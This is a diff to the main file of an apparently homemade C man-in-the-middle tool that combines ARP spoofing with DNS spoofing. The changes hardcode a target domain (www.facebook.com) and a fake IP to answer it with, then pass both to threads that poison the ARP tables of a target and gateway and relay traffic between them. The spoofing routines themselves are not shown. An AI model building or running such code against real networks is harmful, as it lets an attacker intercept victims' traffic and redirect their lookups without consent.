@@ -1,5 +1,6 @@
 #include "arpspoof.h"
 #include "dnsspoof.h"
+#include "utils.h"
 #include <pthread.h>
 
 
@@ -15,6 +16,16 @@ int main(int argc, char** argv[]){
 
     uint8_t *ip_target = (uint8_t*) calloc(4, sizeof(uint8_t));
     uint8_t *ip_gateway = (uint8_t*) calloc(4, sizeof(uint8_t));
+    char *qname = (char*) calloc(REQUEST_SIZE, sizeof(char));
+    uint8_t* ip_dns_fake = (uint8_t*) calloc(4, sizeof(uint8_t));
+
+    /*tam thoi de IP cua VNU*/
+    *(ip_dns_fake) = 112; //0x70
+    *(ip_dns_fake+1) = 137; //0x89
+    *(ip_dns_fake+2) = 142; //0x8E
+    *(ip_dns_fake+3) = 4;   //0x04
+
+    memcpy(qname, "www.facebook.com", 16);
 
     char interface[IFNAMSIZ];
     strcpy(interface, argv[1]);
@@ -89,6 +100,8 @@ int main(int argc, char** argv[]){
     close(fd);
     fprintf(stderr, "Target MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
     fprintf(stderr, "Gateway MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *gateway_mac, *(gateway_mac+1), *(gateway_mac+2), *(gateway_mac+3), *(gateway_mac+4), *(gateway_mac+5));
+    fprintf(stderr, "Target QNAME: %s\n", qname);
+    fprintf(stderr, "Spoof IP: %d.%d.%d.%d\n__________\n", *ip_dns_fake, *(ip_dns_fake+1), *(ip_dns_fake+2), *(ip_dns_fake+3));
     //start arp attack
     pthread_t arpspoof, tar_to_gtw, gtw_to_tar;
  
@@ -102,9 +115,8 @@ int main(int argc, char** argv[]){
     args->target_ip = ip_target;
     args->gateway_mac = gateway_mac;
     args->my_ip = my_ip;
-
-
-    
+    args->ip_dns_fake = ip_dns_fake;
+    args->qname = qname;
     pthread_create(&arpspoof, NULL, arp_spoofing, (void*) args);
     pthread_create(&tar_to_gtw, NULL, target_to_gateway, (void*) args);
     pthread_create(&gtw_to_tar, NULL, gateway_to_target, (void*) args);
